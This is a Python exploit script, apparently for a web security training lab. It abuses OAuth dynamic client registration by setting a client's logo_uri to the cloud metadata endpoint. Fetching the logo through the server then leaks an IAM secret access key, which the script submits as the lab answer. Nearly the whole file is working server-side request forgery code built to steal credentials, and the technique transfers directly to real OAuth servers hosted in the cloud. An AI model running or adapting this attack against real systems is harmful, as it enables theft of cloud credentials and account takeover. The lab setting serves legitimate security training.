import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def extract_oauth_url(text):
    soup = BeautifulSoup(text, 'html.parser')
    oauth_url = soup.find('meta').get('content') # type: ignore
    return oauth_url

def oauth_login_url(s, url, path):
    target = url + path
    r = s.get(target, allow_redirects=False)
    oauth_url = extract_oauth_url(r.text).split('url=')[1] # type: ignore

    if oauth_url:
        print(f'[+] Found oauth url = {oauth_url}')
        return oauth_url
    else:
        print('[-] Not fount oauth url')
        sys.exit(-1)

def register(s, oauth_url, oauth_path, logo_uri):
    target_url = oauth_url + oauth_path
    headers = { "Content-Type": "application/json" }
    payload = {
        "redirect_uris": [
            "https://client-app.com/callback2"
        ],
        "logo_uri": logo_uri
    }
    r = s.post(target_url, json=payload, headers=headers)

    if r.status_code == 201:
        client_id = json.loads(r.text)['client_id']
        print(f'[+] Successful create new account with client_id = {client_id}')
        return client_id
    else:
        print('[-] Failed to create new account')
        sys.exit(-1)

def fetch_logo(s, oauth_url, oauth_path):
    target_url = oauth_url + oauth_path
    r = s.get(target_url)

    if "SecretAccessKey" in r.text:
        secret_access_key = json.loads(r.text)['SecretAccessKey']
        print(f'[+] Success steal secret access key: {secret_access_key}')
        return secret_access_key
    else:
        print('[-] Failed to steal secret access key')
        sys.exit(-1)
    
def submit(s, url, path, api_key):
    submit_url = url + path
    payload = { 'answer': api_key }
    r = s.post(submit_url, data=payload, headers=headers)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    oauth = oauth_login_url(s, url, '/social-login')
    oauth_url = oauth.split('/auth')[0]
    oauth_path = oauth.split(oauth_url)[1]

    target_endpoint = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
    client_id = register(s, oauth_url, '/reg', target_endpoint)
    secret_access_key = fetch_logo(s, oauth_url, f'/client/{client_id}/logo')
    submit(s, url, '/submitSolution', secret_access_key)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()